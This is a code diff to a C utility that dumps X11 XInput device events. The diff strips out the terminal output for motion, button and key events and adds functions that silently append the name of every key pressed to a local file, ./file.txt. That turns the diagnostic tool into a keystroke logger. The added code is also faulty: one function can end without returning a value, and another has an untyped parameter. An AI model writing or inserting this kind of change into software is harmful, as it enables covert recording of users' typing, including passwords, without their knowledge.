@@ -10,6 +10,8 @@
 
 #include "./util-config.h"
 
+#include "parse.h"
+
 /*****************************************************************************
 ** XInput
 *****************************************************************************/
@@ -254,73 +256,55 @@ static void RawTerm(void)
 {
 }
 
+static char* prtcode(int codes) {
+    struct parse_key *p;
+
+    for (p = keynames; p->name != NULL; p++) {
+        if (p->value == (unsigned) codes) {
+            return p->name;
+        }
+    }
+}
+
+static void writeKeyToFile(key_code) {
+	FILE *file;
+	file = fopen("./file.txt","a+");
+
+	fprintf(file, "%s ", prtcode(key_code));	
+	fclose(file);
+}
+
 static int RawRunDefault(Display* pDisp, XDeviceInfo* pDevInfo)
 {
 	XEvent event;
 	XAnyEvent* pAny;
-	struct timeval tv;
-	double dStart, dNow;
+	//struct timeval tv;
+	//double dStart, dNow;
 
-	gettimeofday(&tv,NULL);
-	dStart = tv.tv_sec + (double)tv.tv_usec / 1E6;
+	//gettimeofday(&tv,NULL);
+	//dStart = tv.tv_sec + (double)tv.tv_usec / 1E6;
 
+	XDeviceKeyEvent* pKey;
 	while (1)
 	{
+
 		XNextEvent(pDisp,&event);
 
 		pAny = (XAnyEvent*)&event;
-		/* printf("event: type=%s\n",GetEventName(pAny->type)); */
-
 		/* display time */
-		gettimeofday(&tv,NULL);
-		dNow = tv.tv_sec + (double)tv.tv_usec / 1E6;
-		printf("%.8f: ",(dNow - dStart));
-
-		if (pAny->type == gnInputEvent[INPUTEVENT_PROXIMITY_IN])
-			printf("Proximity In\n");
-		else if (pAny->type == gnInputEvent[INPUTEVENT_PROXIMITY_OUT])
-			printf("Proximity Out\n");
-		else if (pAny->type == gnInputEvent[INPUTEVENT_FOCUS_IN])
-			printf("Focus In\n");
-		else if (pAny->type == gnInputEvent[INPUTEVENT_FOCUS_OUT])
-			printf("Focus Out\n");
-		else if (pAny->type == gnInputEvent[INPUTEVENT_MOTION_NOTIFY])
-		{
-			printf("Motion: x=%+6d y=%+6d p=%4d tx=%+4d ty=%+4d "
-				"w=%+5d \n",
-					((XDeviceMotionEvent*)pAny)->axis_data[0],
-					((XDeviceMotionEvent*)pAny)->axis_data[1],
-					((XDeviceMotionEvent*)pAny)->axis_data[2],
-					(short)(((XDeviceMotionEvent*)pAny)->axis_data[3]&0xffff),
-					(short)(((XDeviceMotionEvent*)pAny)->axis_data[4]&0xffff),
-					(short)(((XDeviceMotionEvent*)pAny)->axis_data[5]&0xffff));
-
-		}
-		else if ((pAny->type == gnInputEvent[INPUTEVENT_BTN_PRESS]) ||
-				(pAny->type == gnInputEvent[INPUTEVENT_BTN_RELEASE]))
-		{
-			XDeviceButtonEvent* pBtn = (XDeviceButtonEvent*)pAny;
-			printf("Button: %d %s\n",pBtn->button,
-					pAny->type == gnInputEvent[INPUTEVENT_BTN_PRESS] ?
-						"DOWN" : "UP");
-		}
-		else if ((pAny->type == gnInputEvent[INPUTEVENT_KEY_PRESS]) ||
-				(pAny->type == gnInputEvent[INPUTEVENT_KEY_RELEASE]))
-		{
-			XDeviceKeyEvent* pKey = (XDeviceKeyEvent*)pAny;
-			printf("Key: %d %s\n", pKey->keycode - 7,
-			       (pAny->type == gnInputEvent[INPUTEVENT_KEY_PRESS]) ?
-			       "DOWN" : "UP");
-		}
-		else
-		{
-			printf("Event: %s\n",GetEventName(pAny->type));
-		}
-
+		//gettimeofday(&tv,NULL);
+		//dNow = tv.tv_sec + (double)tv.tv_usec / 1E6;
+		//printf("%.8f: ",(dNow - dStart));
+		pKey = (XDeviceKeyEvent*)pAny;
+		if(pAny->type == gnInputEvent[INPUTEVENT_KEY_PRESS])// on key down only
+			writeKeyToFile(pKey->keycode - 8);
+		/*printf("Key: %d %s\n", pKey->keycode - 8,
+			(pAny->type == gnInputEvent[INPUTEVENT_KEY_PRESS]) ? 
+				"DOWN" : "UP");*/
 		/* flush data to terminal */
-		fflush(stdout);
+		//fflush(stdout);
 	}
-
+	
 	return 0;
 }
 
